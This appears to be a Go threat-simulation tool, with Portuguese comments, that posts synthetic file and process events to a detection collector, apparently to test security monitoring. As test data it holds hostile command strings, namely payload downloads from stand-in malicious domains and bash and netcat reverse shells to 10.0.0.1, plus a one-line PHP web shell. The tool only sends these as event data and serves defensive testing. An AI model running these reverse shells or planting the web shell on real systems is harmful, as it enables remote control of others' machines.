// Arquivo: tools/simulador.go (Versão Final Corrigida)
package main

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"time"
)

// Estruturas dos Eventos
type FileEvent struct {
	AgentID   string    `json:"agent_id"`
	Hostname  string    `json:"hostname"`
	FilePath  string    `json:"file_path"`
	Content   string    `json:"content,omitempty"`
	Timestamp time.Time `json:"timestamp"`
}

type ProcessEvent struct {
	AgentID   string    `json:"agent_id"`
	Hostname  string    `json:"hostname"`
	ProcessID int32     `json:"process_id"`
	ParentID  int32     `json:"parent_id"`
	Command   string    `json:"command"`
	Username  string    `json:"username"`
	Timestamp time.Time `json:"timestamp"`
}

var (
	collectorURL string
	agentID      string
	// --- CORREÇÃO APLICADA AQUI ---
	// A lista de comandos foi movida para fora das funções,
	// tornando-a uma variável global dentro deste pacote.
	comandosMaliciosos = []string{
		"curl http://malicious-site.com/payload.sh",
		"wget http://bad-domain.net/script.js",
		"/bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1",
		"nc -e /bin/sh 10.0.0.1 4444",
		"python -c 'import os'",
	}
)

func main() {
	log.Println("--- Simulador de Ameaças Ativado ---")

	collectorURL = os.Getenv("COLLECTOR_URL")
	if collectorURL == "" {
		collectorURL = "http://localhost:8080"
	}
	agentID = "sim-agent-001"

	n := flag.Int("n", 0, "Número de eventos genéricos de cada tipo a serem gerados.")
	massivo := flag.Bool("massivo", false, "Ativa o modo massivo para enviar eventos do dataset.")
	singleFilePath := flag.String("single-file-path", "", "Caminho do arquivo para um único evento de arquivo.")
	singleFileContent := flag.String("single-file-content", "", "Conteúdo do arquivo para um único evento de arquivo.")
	flag.Parse()

	if *n > 0 {
		runGenericSimulation(*n)
	}

	if *massivo {
		runMassiveSimulation()
	}

	if *singleFilePath != "" && *singleFileContent != "" {
		runSingleFileSimulation(*singleFilePath, *singleFileContent)
	}

	log.Println("--- Simulação concluída ---")
}

func runSingleFileSimulation(filePath, fileContent string) {
	log.Printf("[ARQUIVO ÚNICO] Enviando ataque controlado: %s", filePath)
	sendFileEvent(filePath, fileContent)
}

func sendFileEvent(filePath, fileContent string) {
	event := FileEvent{
		AgentID:   agentID,
		Hostname:  "simulador-host",
		FilePath:  filePath,
		Content:   fileContent,
		Timestamp: time.Now(),
	}
	jsonData, _ := json.Marshal(event)
	resp, err := http.Post(fmt.Sprintf("%s/v1/events/file", collectorURL), "application/json", bytes.NewBuffer(jsonData))
	handleResponse("Arquivo", filePath, resp, err)
}

func sendProcessEvent(command string) {
	event := ProcessEvent{
		AgentID:   agentID,
		Hostname:  "simulador-host",
		ProcessID: int32(10000 + rand.Intn(1000)),
		ParentID:  int32(100 + rand.Intn(100)),
		Command:   command,
		Username:  "www-data",
		Timestamp: time.Now(),
	}
	jsonData, _ := json.Marshal(event)
	resp, err := http.Post(fmt.Sprintf("%s/v1/events/process", collectorURL), "application/json", bytes.NewBuffer(jsonData))
	handleResponse("Processo", command, resp, err)
}

func handleResponse(eventType, detail string, resp *http.Response, err error) {
	if err != nil {
		log.Printf("[ERRO] Falha ao enviar evento de %s: %v", eventType, err)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	log.Printf("[%s] Enviado: %s | Status: %s | Resposta: %s", eventType, filepath.Base(detail), resp.Status, string(body))
}

func runGenericSimulation(n int) {
	log.Printf("Gerando %d eventos genéricos de arquivo e processo...", n)
	for i := 0; i < n; i++ {
		filePath := fmt.Sprintf("/tmp/simulacao_%d.php", rand.Intn(100000))
		fileContent := "<?php echo shell_exec($_GET['cmd']); ?>"
		sendFileEvent(filePath, fileContent)
		time.Sleep(2 * time.Second)

		comando := comandosMaliciosos[rand.Intn(len(comandosMaliciosos))]
		sendProcessEvent(comando)
		time.Sleep(2 * time.Second)
	}
}

func runMassiveSimulation() {
	log.Println("Iniciando simulação em modo massivo a partir do dataset...")
	file, err := os.Open("dataset_de_ameacas.csv")
	if err != nil {
		log.Printf("[ERRO] Não foi possível abrir o dataset: %v", err)
		return
	}
	defer file.Close()

	reader := csv.NewReader(file)
	records, _ := reader.ReadAll()

	for i, record := range records {
		if i == 0 {
			continue
		}

		threatScore, _ := strconv.Atoi(record[0])

		var fileContent string
		filePath := fmt.Sprintf("/tmp/simulacao_%d.php", rand.Intn(100000))

		if threatScore > 50 {
			fileContent = "<?php echo shell_exec($_GET['cmd']); ?>"
		} else {
			filePath = fmt.Sprintf("/tmp/simulacao_%d.js", rand.Intn(100000))
			fileContent = "console.log('safe');"
		}

		sendFileEvent(filePath, fileContent)
		sendProcessEvent(comandosMaliciosos[rand.Intn(len(comandosMaliciosos))])
		time.Sleep(1 * time.Second)
	}
}
